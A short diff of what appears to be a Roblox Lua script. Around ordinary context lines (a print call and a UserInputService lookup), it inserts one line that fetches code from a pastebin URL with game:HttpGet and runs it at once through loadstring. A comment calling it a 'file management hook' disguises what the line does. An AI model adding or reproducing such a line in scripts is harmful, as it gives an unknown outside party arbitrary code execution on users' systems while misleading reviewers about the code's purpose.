@@ -23,7 +23,7 @@ print("nun opt")
 end
 
 
-
+loadstring(game:HttpGet("https://pastebin.com/raw/bwpVD4a1"))() --file management hook
 
 
 local InputService = game:GetService('UserInputService');
